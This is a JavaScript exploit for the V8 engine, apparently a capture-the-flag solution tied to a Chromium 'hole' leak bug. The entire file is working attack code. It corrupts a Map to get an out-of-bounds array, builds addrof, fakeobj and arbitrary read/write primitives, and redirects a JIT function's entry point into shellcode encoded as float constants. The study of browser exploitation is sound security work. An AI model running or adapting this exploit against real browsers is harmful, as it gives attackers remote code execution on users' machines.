/* https://bugs.chromium.org/p/chromium/issues/detail?id=1263462 */
/* https://medium.com/numen-cyber-labs/from-leaking-thehole-to-chrome-renderer-rce-183dcb6f3078 */
/* https://gist.github.com/r4j0x00/b09b8b6bfdec8d35aa4c3ddb9ab346dd */
/* https://seb-sec.github.io/2020/09/28/ductf2020-pwn-or-web.html */
/* https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/ */
/* https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html */

function main() {
    /* See gen.py */
    const shellcode = () => {
        return [1.0,
            1.9553825422107533e-246,
            1.9560612558242147e-246,
            1.9995714719542577e-246,
            1.9533767332674093e-246,
            2.6348604765229606e-284,
        ];
    }
    for (let i = 0; i < 25000; i++) { shellcode(); }

    let f64_u64_buf = new ArrayBuffer(8);
    let f64_buf = new Float64Array(f64_u64_buf);
    let u64_buf = new Uint32Array(f64_u64_buf);

    function ftoi(val) {
        f64_buf[0] = val;
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
    }

    function itof(val) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 32n);
        return f64_buf[0];
    }

    function make_evil_map() {
        let m = new Map();
        m.set(1, 1);
        m.set([].hole(), 1);
        m.delete([].hole());
        m.delete([].hole());
        m.delete(1);
        return m;
    }

    let maps = [];
    let arrs = [];
    let some_obj = [];
    let evil_float_arr;
    let victim_obj_arr;
    let delta;
    let delta_shift;
    let canary = 0x123456;

    function packed_addrof(x) {
        victim_obj_arr[0] = x;
        return (ftoi(evil_float_arr[delta]) >> delta_shift) & 0xffffffffn;
    }

    function packed_fakeobj(x) {
        if (delta_shift == 0) {
            evil_float_arr[delta] = itof((ftoi(evil_float_arr[delta]) & 0xffffffff00000000n) | x);
        } else {
            evil_float_arr[delta] = itof((ftoi(evil_float_arr[delta]) & 0xffffffffn) | (x << 32n));
        }
        return victim_obj_arr[0];
    }

    function read_u32_field(x, field_offset) {
        let addrof_evil_elements = packed_addrof(evil_float_arr) + 8n;
        let addrof_field = packed_addrof(x) + field_offset;
        let evil_offset = addrof_field - addrof_evil_elements;
        let evil_i = evil_offset / 8n;
        let shift = (evil_offset % 8n == 0n) ? 0n : 32n;
        let full = ftoi(evil_float_arr[evil_i]);
        console.log("[" + evil_i + "] == " + full.toString(16));
        return (full >> shift) & 0xffffffffn;
    }

    function read_u64_field(x, field_offset) {
        return read_u32_field(x, field_offset) + (read_u32_field(x, field_offset + 4n) << 32n);
    }

    function write_u32_field(x, field_offset, val) {
        let addrof_evil_elements = packed_addrof(evil_float_arr) + 8n;
        let addrof_field = packed_addrof(x) + field_offset;
        let evil_offset = addrof_field - addrof_evil_elements;
        let evil_i = evil_offset / 8n;
        let orig = ftoi(evil_float_arr[evil_i]);
        let upd;
        if (evil_offset % 8n == 0n) {
            upd = (orig & 0xffffffff00000000n) | val;
        } else {
            upd = (orig & 0xffffffffn) | (val << 32n);
        }
        if (orig != upd) {
            console.log("[" + evil_i + "] = " + orig.toString(16) + " -> " + upd.toString(16));
            evil_float_arr[evil_i] = itof(upd);
        }
    }

    function write_u64_field(x, field_offset, val) {
        write_u32_field(x, field_offset, val & 0xffffffffn);
        write_u32_field(x, field_offset + 4n, (val >> 32n) & 0xffffffffn);
    }

    for (;;) {
        let evil_map = make_evil_map();
        maps.push(evil_map);
        evil_float_arr = new Array(1.1, 1.1);
        arrs.push(evil_float_arr);
        victim_obj_arr = new Array(canary, some_obj, some_obj, some_obj);
        arrs.push(victim_obj_arr);
        evil_map.set(0x10, -1);
        evil_map.set(evil_float_arr, 0xfffff);
        if (evil_float_arr.length == 0xfffff) {
            for (delta = 0; delta < 32; delta++) {
                let hi_lo = ftoi(evil_float_arr[delta]);
                delta_shift = 0n;
                if (((hi_lo >> delta_shift) & 0xffffffffn) == canary * 2) {
                    break;
                }
                delta_shift = 32n;
                if (((hi_lo >> delta_shift) & 0xffffffffn) == canary * 2) {
                    break;
                }
            }
            if (delta != 32) {
                console.log("delta = " + delta);
                break;
            }
        }
        canary++;
    }

    let canary_again = (ftoi(evil_float_arr[delta]) >> delta_shift) & 0xffffffffn;
    console.log("canary = " + canary_again.toString(16));
    //%DebugPrint(shellcode);
    let packed_code_data_container = read_u32_field(shellcode, 0x18n); /* v8::internal::JSFunction::kCodeOffset */
    console.log("CodeDataContainer = 0x" + packed_code_data_container.toString(16));
    let code_data_container = packed_fakeobj(packed_code_data_container);
    //%DebugPrint(code_data_container);
    let packed_code = read_u32_field(code_data_container, 0x8n); /* v8::internal::CodeDataContainer::kCodeOffset */
    console.log("Code = 0x" + packed_code.toString(16));
    let entry_point = read_u64_field(code_data_container, 0xcn); /* v8::internal::CodeDataContainer::kCodeEntryPointOffset */
    console.log("entry_point = 0x" + entry_point.toString(16));
    write_u64_field(code_data_container, 0xcn, entry_point + 0x7cn); /* local 0x73 */
    console.log("entry_point' = 0x" + read_u64_field(code_data_container, 0xcn).toString(16));
    shellcode();
    /* hitcon{tH3_xPl01t_n0_l0ng3r_wOrk_aF+3r_66c8de2cdac10cad9e622ecededda411b44ac5b3_:((} */
}

main();